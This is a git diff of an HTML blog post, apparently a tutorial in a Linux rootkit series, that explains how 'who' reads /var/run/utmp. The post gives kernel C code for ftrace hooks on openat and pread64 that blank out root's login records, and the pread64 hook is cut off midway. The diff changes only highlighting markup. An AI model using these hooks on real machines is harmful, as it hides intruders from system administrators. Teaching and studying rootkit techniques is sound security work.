@@ -183,205 +183,205 @@ Looking at the output of who, we see a list of all the active terminal devices a
 <p>If you take a look at <code>/dev</code>, then you&rsquo;ll probably see <em>a lot</em> of <code>tty</code> devices, however not all of these are actually attached anywhere (in fact, most are <em>not</em>). Under <code>/dev/pts</code>, you&rsquo;ll see your active <code>pts</code> devices too. There isn&rsquo;t much that we can do to them here though, so let&rsquo;s go back to the output of <code>who</code>.</p>
 <h1 id="utmp">UTMP<a href="#utmp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Seeing as we don&rsquo;t know <em>how</em> <code>who</code> &ldquo;knows&rdquo; who&rsquo;s logged in, the easiest thing to do is to run it through <code>strace</code>. I suspected that it might be using a file somewhere on the system to keep track of users, so I applied the <code>-e openat</code> filter to only look at the files that <code>who</code> was opening on the system. This paid off as we find the following line in the output:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openat<span style="color:#f92672">(</span>AT_FDCWD, <span style="color:#e6db74">&#34;/var/run/utmp&#34;</span>, O_RDONLY|O_CLOEXEC<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
-</code></pre></div><p>This looks interesting! Let&rsquo;s take a look at this file ourselves:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /var/run/utmp
-pts/0ts/0vagrant10.0.2.2y_|H5~~~runlevel5.4.0-48-genericy_tty1tty1tty1LOGINy_
-</code></pre></div><p>Other than the word <code>pts</code> and the username <code>vagrant</code> in there, this looks like junk. However, the size of the file (on my system) is <code>1536</code>, so there&rsquo;s clearly a lot of unprintable bytes in there. Piping the output into <code>xxd</code> or <code>hexyl</code> confirms that we&rsquo;ve got a binary file. If we take a look at <a href="https://man7.org/linux/man-pages/man5/utmp.5.html"><code>man utmp</code></a>, we discover that <code>utmp</code> does indeed store login records for the system - and the file we&rsquo;ve found is just a dump of number of <code>utmp</code> structs! Excellent - we can parse this ourselves.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openat<span style="color:#f92672">(</span>AT_FDCWD, <span style="color:#e6db74">&#34;/var/run/utmp&#34;</span>, O_RDONLY|O_CLOEXEC<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span></code></pre></div><p>This looks interesting! Let&rsquo;s take a look at this file ourselves:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat /var/run/utmp
+</span></span><span style="display:flex;"><span>pts/0ts/0vagrant10.0.2.2y_|H5~~~runlevel5.4.0-48-genericy_tty1tty1tty1LOGINy_
+</span></span></code></pre></div><p>Other than the word <code>pts</code> and the username <code>vagrant</code> in there, this looks like junk. However, the size of the file (on my system) is <code>1536</code>, so there&rsquo;s clearly a lot of unprintable bytes in there. Piping the output into <code>xxd</code> or <code>hexyl</code> confirms that we&rsquo;ve got a binary file. If we take a look at <a href="https://man7.org/linux/man-pages/man5/utmp.5.html"><code>man utmp</code></a>, we discover that <code>utmp</code> does indeed store login records for the system - and the file we&rsquo;ve found is just a dump of number of <code>utmp</code> structs! Excellent - we can parse this ourselves.</p>
 <p>Before diving straight into writing a kernel module (at this point, I still wasn&rsquo;t sure how I was going to hide a user without overwriting this file), I decided to write a userspace tool to parse this file to get to grips with it&rsquo;s layout. The result is <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/master/3_RootkitTechniques/3.9_hiding_logged_in_users/enum_utmp.c"><code>enum_utmp</code></a> and it&rsquo;s output on the same system as before looks like:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./enum_utmp
-<span style="color:#f92672">[</span>Entry 0<span style="color:#f92672">]</span>
- ut_type <span style="color:#f92672">=</span> BOOT_TIME
- ut_pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> - <span style="color:#e6db74">&#34;&#34;</span>
- ut_line <span style="color:#f92672">=</span> ~
- ut_user <span style="color:#f92672">=</span> reboot
-
-<span style="color:#f92672">[</span>Entry 1<span style="color:#f92672">]</span>
- ut_type <span style="color:#f92672">=</span> RUN_LVL
- ut_pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">53</span> - <span style="color:#e6db74">&#34;&#34;</span>
- ut_line <span style="color:#f92672">=</span> ~
- ut_user <span style="color:#f92672">=</span> runlevel
-
-<span style="color:#f92672">[</span>Entry 2<span style="color:#f92672">]</span>
- ut_type <span style="color:#f92672">=</span> LOGIN_PROCESS
- ut_pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">659</span> - <span style="color:#e6db74">&#34;/sbin/agetty&#34;</span>
- ut_line <span style="color:#f92672">=</span> tty1
- ut_user <span style="color:#f92672">=</span> LOGIN
-
-<span style="color:#f92672">[</span>Entry 3<span style="color:#f92672">]</span>
- ut_type <span style="color:#f92672">=</span> USER_PROCESS
- ut_pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">1154</span> - <span style="color:#e6db74">&#34;sshd: vagrant [priv]&#34;</span>
- ut_line <span style="color:#f92672">=</span> pts/0
- ut_user <span style="color:#f92672">=</span> vagrant
-</code></pre></div><p>It&rsquo;s very simple: first it reads the contents of <code>/var/run/utmp</code> into a buffer, then it loops over each <code>384</code> byte chunk (the size of the <code>utmp</code> struct defined by <code>/usr/include/utmp.h</code>), printing out four of the most relevant fields for each struct. For added insight, it also looks up the name of the process assigned to the PID for each entry too (under <code>/proc/$PID/cmdline</code>).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./enum_utmp
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Entry 0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> ut_type <span style="color:#f92672">=</span> BOOT_TIME
+</span></span><span style="display:flex;"><span> ut_pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> - <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span> ut_line <span style="color:#f92672">=</span> ~
+</span></span><span style="display:flex;"><span> ut_user <span style="color:#f92672">=</span> reboot
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Entry 1<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> ut_type <span style="color:#f92672">=</span> RUN_LVL
+</span></span><span style="display:flex;"><span> ut_pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">53</span> - <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span> ut_line <span style="color:#f92672">=</span> ~
+</span></span><span style="display:flex;"><span> ut_user <span style="color:#f92672">=</span> runlevel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Entry 2<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> ut_type <span style="color:#f92672">=</span> LOGIN_PROCESS
+</span></span><span style="display:flex;"><span> ut_pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">659</span> - <span style="color:#e6db74">&#34;/sbin/agetty&#34;</span>
+</span></span><span style="display:flex;"><span> ut_line <span style="color:#f92672">=</span> tty1
+</span></span><span style="display:flex;"><span> ut_user <span style="color:#f92672">=</span> LOGIN
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Entry 3<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> ut_type <span style="color:#f92672">=</span> USER_PROCESS
+</span></span><span style="display:flex;"><span> ut_pid <span style="color:#f92672">=</span> <span style="color:#ae81ff">1154</span> - <span style="color:#e6db74">&#34;sshd: vagrant [priv]&#34;</span>
+</span></span><span style="display:flex;"><span> ut_line <span style="color:#f92672">=</span> pts/0
+</span></span><span style="display:flex;"><span> ut_user <span style="color:#f92672">=</span> vagrant
+</span></span></code></pre></div><p>It&rsquo;s very simple: first it reads the contents of <code>/var/run/utmp</code> into a buffer, then it loops over each <code>384</code> byte chunk (the size of the <code>utmp</code> struct defined by <code>/usr/include/utmp.h</code>), printing out four of the most relevant fields for each struct. For added insight, it also looks up the name of the process assigned to the PID for each entry too (under <code>/proc/$PID/cmdline</code>).</p>
 <p>Clearly, this is now our target for manipulation. We <em>could</em> just edit this file and remove entries where <code>ut_user</code> matches <code>root</code>, but let&rsquo;s be a little more clever. Let&rsquo;s see if we can modify reads to <code>/var/run/utmp</code> on the fly <em>without touching disk!</em></p>
 <h1 id="how-do-userspace-tools-parse-utmp">How do userspace tools parse UTMP?<a href="#how-do-userspace-tools-parse-utmp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>First, we need to go back to the output of <code>strace</code> from earlier. We know that <code>who</code> calls <code>sys_openat()</code> to open <code>/var/run/utmp</code>, but what does it do next? Here is a (heavily truncated) output of <code>strace who</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openat<span style="color:#f92672">(</span>AT_FDCWD, <span style="color:#e6db74">&#34;/var/run/utmp&#34;</span>, O_RDONLY|O_CLOEXEC<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
-
-pread64<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;\2\0\0\0\0\0\0\0~\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 384, 0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">384</span>
-pread64<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;\1\0\0\0005\0\0\0~\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 384, 384<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">384</span>
-pread64<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;\6\0\0\0\223\2\0\0tty1\0tty1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 384, 768<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">384</span>
-pread64<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;\7\0\0\0\202\4\0\0pts/0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 384, 1152<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">384</span>
-pread64<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;&#34;</span>, 384, 1536<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-
-close<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
-</code></pre></div><p>Aha! Those 4 calls to <code>sys_pread64()</code> correspond to the 4 entries in the output of <code>enum_utmp</code> above. This tells us that <code>who</code> uses the <code>sys_pread64()</code> syscall to read the contents of <code>/var/run/utmp</code> in chunks of <code>384</code> bytes at a time (the final argument of <code>sys_pread64()</code> is an offset, and we can see above that it starts at <code>0</code> (the start of the file) and increments by <code>384</code> each time it&rsquo;s called).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openat<span style="color:#f92672">(</span>AT_FDCWD, <span style="color:#e6db74">&#34;/var/run/utmp&#34;</span>, O_RDONLY|O_CLOEXEC<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pread64<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;\2\0\0\0\0\0\0\0~\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 384, 0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">384</span>
+</span></span><span style="display:flex;"><span>pread64<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;\1\0\0\0005\0\0\0~\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 384, 384<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">384</span>
+</span></span><span style="display:flex;"><span>pread64<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;\6\0\0\0\223\2\0\0tty1\0tty1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 384, 768<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">384</span>
+</span></span><span style="display:flex;"><span>pread64<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;\7\0\0\0\202\4\0\0pts/0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#34;</span>..., 384, 1152<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">384</span>
+</span></span><span style="display:flex;"><span>pread64<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;&#34;</span>, 384, 1536<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>close<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>Aha! Those 4 calls to <code>sys_pread64()</code> correspond to the 4 entries in the output of <code>enum_utmp</code> above. This tells us that <code>who</code> uses the <code>sys_pread64()</code> syscall to read the contents of <code>/var/run/utmp</code> in chunks of <code>384</code> bytes at a time (the final argument of <code>sys_pread64()</code> is an offset, and we can see above that it starts at <code>0</code> (the start of the file) and increments by <code>384</code> each time it&rsquo;s called).</p>
 <p>If we can intercept these calls to <code>sys_pread64()</code> with a syscall hook, we can parse each buffer that gets filled as a <code>utmp</code> struct and overwrite any whose <code>ut_user</code> field matches <code>root</code> with <code>0x0</code>! This technique is similar in idea to <a href="../linux_rootkits_06">Part 6</a> and <a href="../linux_rootkits_07">Part 7</a>, but, as you&rsquo;ll soon see, the execution is quite different.</p>
 <p>The trouble is that we can&rsquo;t just parse <em>every</em> buffer filled by <code>sys_pread64()</code> - how do we know that it&rsquo;s even a <code>utmp</code> struct? I suppose we could check if the size of the buffer is exactly <code>384</code> bytes, but that&rsquo;s still a bit messy. A nicer idea is to hook <code>sys_openat()</code> too and watch for an attempt to open <code>/var/run/utmp</code> (remember, read syscalls only get a file descriptor, whereas open syscalls get the actual filename!). We can then save this file descriptor so we only have to check whether it matches the argument passed to <code>sys_pread64()</code>. This will also not bog down the kernel as much because we&rsquo;re only doing an integer comparison each time <code>sys_pread64()</code> is called rather than parsing <em>every single buffer</em> that passes through.</p>
 <h1 id="hooking-the-syscalls">Hooking The Syscalls<a href="#hooking-the-syscalls" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Experimenting with hooking <code>sys_openat()</code> is nasty. This is because it gets called almost constantly, and is <em>very</em> sensitive to timing delays. This means that we don&rsquo;t have much breathing space in our hook to do much. In particular, if we save the return value of <code>sys_openat()</code> and then take too long before returning, the whole system locks up (another reason why using vagrant is so useful!). This is especially the case if there is any branching behaviour going on.</p>
 <p>In order to avoid this, when we write the <code>hook_openat()</code> function, we have to be very careful to have as little code as possible between calling <code>orig_openat()</code> and returning the file descriptor it gives us. Luckily, the thing we care about is the filename, which is passed as an argument to <code>sys_openat()</code>. That means that we&rsquo;re free to do our comparisons and if/else statements before we ever have to call <code>orig_openat()</code>.</p>
 <p>With all that in mind, the actual hook is fairly simple:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
-</span><span style="color:#75715e"> * Global variable for the file descriptor we need to mess with.
-</span><span style="color:#75715e"> * In practice, hook_openat() will set it, and hook_pread64()
-</span><span style="color:#75715e"> * will read it.
-</span><span style="color:#75715e"> */</span>
-<span style="color:#66d9ef">int</span> tamper_fd;
-
-<span style="color:#75715e">/* Declaration for the real sys_openat() - pointer fixed by Ftrace */</span>
-<span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">long</span> (<span style="color:#f92672">*</span>orig_openat)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>);
-
-<span style="color:#75715e">/* Sycall hook for sys_open() */</span>
-asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_openat</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
-{
-    <span style="color:#75715e">/*
-</span><span style="color:#75715e">     * Pull the filename out of the regs struct
-</span><span style="color:#75715e">     */</span>
-    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>filename <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)regs<span style="color:#f92672">-&gt;</span>si;
-
-    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>kbuf;
-    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/run/utmp&#34;</span>;
-    <span style="color:#66d9ef">int</span> target_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">14</span>;
-    <span style="color:#66d9ef">long</span> error;
-
-    <span style="color:#75715e">/*
-</span><span style="color:#75715e">     * Allocate a kernel buffer to copy the filename into
-</span><span style="color:#75715e">     * If it fails, just return the real sys_openat() without delay
-</span><span style="color:#75715e">     */</span>
-    kbuf <span style="color:#f92672">=</span> kzalloc(NAME_MAX, GFP_KERNEL);
-    <span style="color:#66d9ef">if</span>(kbuf <span style="color:#f92672">==</span> NULL)
-        <span style="color:#66d9ef">return</span> orig_openat(regs);
-
-    <span style="color:#75715e">/*
-</span><span style="color:#75715e">     * Copy the filename from userspace into the kernel buffer
-</span><span style="color:#75715e">     * If it fails, just return the real sys_openat() without delay
-</span><span style="color:#75715e">     */</span>
-    error <span style="color:#f92672">=</span> copy_from_user(kbuf, filename, NAME_MAX);
-    <span style="color:#66d9ef">if</span>(error)
-        <span style="color:#66d9ef">return</span> orig_openat(regs);
-
-    <span style="color:#75715e">/*
-</span><span style="color:#75715e">     * Compare the filename to &#34;/var/run/utmp&#34;
-</span><span style="color:#75715e">     * If we get a match, call orig_openat(), save the result in tamper_fd,
-</span><span style="color:#75715e">     * and return after freeing the kernel buffer. We just about get away with
-</span><span style="color:#75715e">     * this delay between calling and returning
-</span><span style="color:#75715e">     */</span>
-    <span style="color:#66d9ef">if</span> ( memcmp(kbuf, target, target_len) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
-    {
-        tamper_fd <span style="color:#f92672">=</span> orig_openat(regs);
-        kfree(kbuf);
-        <span style="color:#66d9ef">return</span> tamper_fd;
-    }
-
-    <span style="color:#75715e">/*
-</span><span style="color:#75715e">     * If we didn&#39;t get a match, then just need to free the buffer and return
-</span><span style="color:#75715e">     */</span>
-    kfree(kbuf);
-    <span style="color:#66d9ef">return</span> orig_openat(regs);
-}
-</code></pre></div><p>Okay, that&rsquo;s fairly straightforward. Luckily, there seems to be just enough tolerance to let us free the kernel buffer in-between saving the file descriptor to <code>tamper_fd</code> and returning it to userspace (<code>hook_openat()</code> is going to get called <em>a lot</em>, so we definitely don&rsquo;t want to leave un-free&rsquo;d kernel buffers lying around!).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Global variable for the file descriptor we need to mess with.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * In practice, hook_openat() will set it, and hook_pread64()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * will read it.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> tamper_fd;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Declaration for the real sys_openat() - pointer fixed by Ftrace */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">long</span> (<span style="color:#f92672">*</span>orig_openat)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Sycall hook for sys_open() */</span>
+</span></span><span style="display:flex;"><span>asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_openat</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Pull the filename out of the regs struct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>filename <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)regs<span style="color:#f92672">-&gt;</span>si;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>kbuf;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/run/utmp&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> target_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">14</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> error;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Allocate a kernel buffer to copy the filename into
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * If it fails, just return the real sys_openat() without delay
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
+</span></span><span style="display:flex;"><span>    kbuf <span style="color:#f92672">=</span> kzalloc(NAME_MAX, GFP_KERNEL);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(kbuf <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> orig_openat(regs);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Copy the filename from userspace into the kernel buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * If it fails, just return the real sys_openat() without delay
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
+</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> copy_from_user(kbuf, filename, NAME_MAX);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(error)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> orig_openat(regs);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Compare the filename to &#34;/var/run/utmp&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * If we get a match, call orig_openat(), save the result in tamper_fd,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * and return after freeing the kernel buffer. We just about get away with
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * this delay between calling and returning
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( memcmp(kbuf, target, target_len) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        tamper_fd <span style="color:#f92672">=</span> orig_openat(regs);
+</span></span><span style="display:flex;"><span>        kfree(kbuf);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> tamper_fd;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * If we didn&#39;t get a match, then just need to free the buffer and return
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
+</span></span><span style="display:flex;"><span>    kfree(kbuf);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> orig_openat(regs);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Okay, that&rsquo;s fairly straightforward. Luckily, there seems to be just enough tolerance to let us free the kernel buffer in-between saving the file descriptor to <code>tamper_fd</code> and returning it to userspace (<code>hook_openat()</code> is going to get called <em>a lot</em>, so we definitely don&rsquo;t want to leave un-free&rsquo;d kernel buffers lying around!).</p>
 <p>Next up, we need to write the <code>hook_pread64()</code> function. The arguments for <code>sys_pread64()</code> are the same as <code>sys_read()</code> except we have an extra <code>loff_t</code> offset which indicates how far into the file we&rsquo;re reading (this is incremented by <code>384</code> each time <code>sys_pread64()</code> is called by <code>who</code>). This means that our hook will take a very similar form to previous hooks of syscalls that fill buffers.</p>
 <p>The first thing we can check is whether the <code>fd</code> argument (stored in the <code>rdi</code> register) matches <code>tamper_fd</code> (and while we&rsquo;re at it, we&rsquo;d better make sure <code>fd</code> isn&rsquo;t <code>0</code>, <code>1</code> or <code>2</code>). If we get a match, then we can go ahead and allocate a kernel buffer, call the real syscall, and copy the filled userspace buffer into the kernel one. At this point, we can parse the buffer by casting it to a <code>utmp</code> struct (I had to stick the struct&rsquo;s definition into a header file because the real <code>utmp.h</code> isn&rsquo;t a kernel header - see <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/master/3_RootkitTechniques/3.9_hiding_logged_in_users/utmp.h"><code>utmp.h</code></a> on the repo).</p>
 <p>Once we&rsquo;ve done that, we can compare the <code>ut_user</code> field with <code>root</code>. If we get a match, then we just overwrite the buffer with <code>0x0</code> and copy it back to the user! If you want to hide a user other than <code>root</code>, then of course you need to change it to something else.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;utmp.h&#34;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#75715e">#define HIDDEN_USER &#34;root&#34;
-</span><span style="color:#75715e"></span>
-<span style="color:#75715e">/* This is the global tamper_fd variable that gets set by hook_openat() */</span>
-<span style="color:#66d9ef">int</span> tamper_fd;
-
-<span style="color:#75715e">/* Usual declaration of orig_pread64(), will have pointer fixed by ftrace */</span>
-<span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">long</span> (<span style="color:#f92672">*</span>orig_pread64)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>);
-
-<span style="color:#75715e">/* Hook for sys_pread64() */</span>
-asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_pread64</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
-{
-    <span style="color:#75715e">/*
-</span><span style="color:#75715e">     * Pull the arguments we need out of the regs struct
-</span><span style="color:#75715e">     */</span>
-    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>di;
-    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)regs<span style="color:#f92672">-&gt;</span>si;
-    size_t count <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>dx;
-
-    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>kbuf;
-    <span style="color:#66d9ef">struct</span> utmp <span style="color:#f92672">*</span>utmp_buf;
-    <span style="color:#66d9ef">long</span> error;
-    <span style="color:#66d9ef">int</span> i, ret;
-
-    <span style="color:#75715e">/*
-</span><span style="color:#75715e">     * Check that fd = tamper_fd and that we&#39;re not messing with STDIN, 
-</span><span style="color:#75715e">     * STDOUT or STDERR
-</span><span style="color:#75715e">     */</span>
